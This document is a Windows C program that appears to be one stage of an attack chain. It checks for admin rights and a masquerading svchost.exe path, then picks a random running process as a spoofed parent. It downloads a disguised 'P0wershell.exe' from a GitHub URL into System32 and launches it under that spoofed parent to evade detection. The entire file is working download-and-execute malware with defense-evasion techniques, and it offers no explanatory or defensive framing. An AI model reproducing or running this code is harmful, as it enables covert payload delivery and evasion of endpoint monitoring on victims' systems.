#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <tlhelp32.h>
#include <urlmon.h>

BOOL WINAPI IsUserAnAdmin(void);

static void log_msg(const char* msg) {
    FILE* f = fopen("C:\\elevcheck.log", "a");
    if (f) { fprintf(f, "%s\n", msg); fclose(f); }
}

static void press_exit(int code, const char* why) {
    char buf[256];
    snprintf(buf, sizeof(buf), "elevcheck exiting (%d)\n%s", code, why ? why : "");
    log_msg(buf);
    MessageBoxA(NULL, buf, "elevcheck", MB_OK | MB_ICONINFORMATION);
    exit(code);
}

int main(void) {
    DeleteFileA("C:\\elevcheck.log");
    log_msg("[+] elevcheck started");

    if (!IsUserAnAdmin())
        press_exit(1, "[-] Not running as admin.");

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (lstrcmpiA(path, "C:\\Program Files\\Microsoft\\svchost.exe") != 0)
        press_exit(1, "[-] Not running from expected path.");

    printf("[+] Running in Elevated Session.\n");

    // pick a random running process as parent (not our own process)
    DWORD targetPID = 0;
    char targetName[MAX_PATH] = "";
    DWORD myPID = GetCurrentProcessId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        DWORD pids[256];
        char names[256][MAX_PATH];
        DWORD count = 0;
        PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (pe.th32ProcessID != myPID && pe.th32ProcessID != 0 && pe.th32ProcessID != 4 && count < 256) {
                    pids[count] = pe.th32ProcessID;
                    lstrcpynA(names[count], pe.szExeFile, MAX_PATH);
                    count++;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
        if (count > 0) {
            srand(GetTickCount());
            DWORD idx = rand() % count;
            targetPID = pids[idx];
            lstrcpynA(targetName, names[idx], MAX_PATH);
        }
    }

    if (targetPID == 0) {
        printf("[-] No valid process found for PPID spoofing.\n");
        press_exit(1, "[-] No valid process found for PPID spoofing.");
    }
    printf("[+] Using %s (PID: %lu) as spoofed parent\n", targetName, targetPID);

    // download P0wershell.exe
    const char* url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/P0wershell.exe";
    const char* outPath = "C:\\Windows\\System32\\P0wershell.exe";
    printf("[+] Downloading P0wershell.exe...\n");
    HRESULT hr = URLDownloadToFileA(NULL, url, outPath, 0, NULL);
    if (hr != S_OK) {
        printf("[-] Download failed (HRESULT: 0x%lx).\n", hr);
        press_exit(1, "[-] P0wershell.exe download failed.");
    }
    printf("[+] Download complete.\n");
    log_msg("[+] P0wershell.exe download complete");

    // PPID spoofing via CreateProcess attribute
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetPID);
    if (!hParent) {
        printf("[-] Failed to open target process (%lu)\n", GetLastError());
        press_exit(1, "[-] Failed to open spoofed parent process.");
    }
    printf("[+] Opened target process handle\n");

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    PPROC_THREAD_ATTRIBUTE_LIST attrList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
    if (!attrList) {
        printf("[-] HeapAlloc failed\n");
        CloseHandle(hParent);
        press_exit(1, "[-] HeapAlloc failed.");
    }

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
        printf("[-] InitializeProcThreadAttributeList failed (%lu)\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hParent);
        press_exit(1, "[-] InitializeProcThreadAttributeList failed.");
    }

    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
        printf("[-] UpdateProcThreadAttribute failed (%lu)\n", GetLastError());
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hParent);
        press_exit(1, "[-] UpdateProcThreadAttribute failed.");
    }
    printf("[+] PPID attribute set\n");
    log_msg("[+] PPID attribute set, about to CreateProcess P0wershell.exe");

    STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(STARTUPINFOEXA) }, .lpAttributeList = attrList };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, (LPSTR)outPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &si.StartupInfo, &pi)) {
        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hParent);
        press_exit(1, "[-] CreateProcess of P0wershell.exe failed.");
    }
    printf("[+] P0wershell.exe launched (PID: %lu) — waiting for completion\n", pi.dwProcessId);
    CloseHandle(pi.hThread);

    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    press_exit(0, "[+] Chain completed.");
}
